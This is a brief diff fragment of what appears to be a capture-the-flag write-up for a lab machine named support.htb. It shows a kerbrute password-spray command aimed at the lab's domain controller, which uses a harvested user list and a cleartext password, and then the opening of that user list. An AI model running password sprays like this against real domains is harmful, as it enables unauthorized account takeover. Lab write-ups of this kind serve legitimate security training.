@@ -16,6 +16,7 @@ modifiedCount: [b'1']
 # Password Spray
 
 ```$ kerbrute passwordspray -d support.htb --dc 10.10.11.174 loot/users.txt 'Ironside47pleasure40Watchful'```
+
 ```loot/users.txt```
 ```
 Administrator
